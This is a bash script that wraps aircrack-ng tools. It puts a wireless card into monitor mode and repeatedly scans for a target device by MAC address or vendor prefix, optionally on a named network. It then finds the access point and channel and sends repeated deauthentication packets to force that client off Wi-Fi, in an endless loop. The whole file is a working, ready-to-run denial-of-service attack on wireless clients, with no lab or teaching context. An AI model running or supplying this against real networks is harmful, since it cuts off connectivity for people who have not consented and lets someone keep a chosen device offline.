#!/bin/bash

# Make sure to kill any airodump-ng tasks in the background

# Device MAC address
MAC="00"

# The first command line is the network interface normally wlan0
defaultInterface="eth0"
NetworkInterface="wlan0"
dumpParam=""

# Command line arguments
# n: Network interface, normally wlan0
# m: specify a OUI or specific mac address as a target
# e: specifiy a wifi network, if not all networks are taregeted
while getopts ":n:m:e:" opt; do
  case $opt in
     n)
       NetworkInterface=$OPTARG
       ;;
     m)
       MAC=$OPTARG
       ;;
     e)
        dumpParam="--essid $OPTARG"
        ;;
     *)
       echo "Invalid flag"
       exit
       ;;
  esac
done

# If MAC is not set exit program
if [ $MAC == "00" ]; then
    echo "No MAC address specified"
    exit
fi

# Take down eth0
echo "Taking down eth0 interface"
if ifconfig | grep $defaultInterface;then
    ifconfig eth0 down
else
echo "eth0 interface already down"
fi

# Kill any network proccess that will interfere
airmon-ng check kill
echo "Killed all airodump-ng processes"

echo "Using network interface: $NetworkInterface"
airmon-ng start $NetworkInterface

# Constantly search for target device wireless access point
CYCLE=0
while [ 1 ]
do
    # Begin search for target device MAC address
    echo "Searching for devices"
    RAW=$(airodump-ng $NetworkInterface $dumpParam -a 2>&1 | grep -m 1 $MAC)
    echo "Found match: $RAW"

    # Extract BSSID and client MAC address from airodump-ng output
    FORMATTED=$(echo "$RAW" | tr -dc '[:alnum:]\n\r:')
    CLEANED=${FORMATTED#"0K1B"}

    BSSID=${CLEANED:0:17}
    CLIENT=${CLEANED:17:17}
    echo "BSSID: $BSSID" 
    echo "CLIENT: $CLIENT"


    # Check untill bssid is found
    SCANLENGTH=2
    S="s"
    while [ 1 ]
    do
        echo "Looking for frequency channel of AP: $BSSID ..."
        sudo timeout $SCANLENGTH$S airodump-ng $NetworkInterface --bssid $BSSID -a > OUTPUTFILE
        echo "Scan complete: $SCANLENGTH$S"
        LEGENDLINE=$(cat ./OUTPUTFILE | grep -m 1 "BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID")
        CH=$(echo "$LEGENDLINE" | grep -b -o "CH" | awk 'BEGIN {FS=":"}{print $1}')

        # Check if bssid is found
        if cat ./OUTPUTFILE | grep -m 1 "$BSSID"; then
            BSSIDLINE=$(cat ./OUTPUTFILE | grep -m 1 "$BSSID")
            break
        else
            echo "$BSSID not found, scanning again"
            SCANLENGTH=$((2*$SCANLENGTH))
        fi
    done
    CHANNEL=${BSSIDLINE:$CH:3}
    echo "Channel found, $BSSID is on channel: $CHANNEL"

    # Change channel of wireless adapater
    echo "Changing channel of $NetworkInterface"
    iwconfig $NetworkInterface channel $CHANNEL

    # Send deauth packets   
    echo "----Sending deauthentication packets----" 
    for i in {1..5}
    do
        aireplay-ng -0 1 -a $BSSID -c $CLIENT $NetworkInterface
        sleep 8
    done
    CYCLE=$((1+$CYCLE))
    echo "-----Restarting cycle: $CYCLE-----"
done

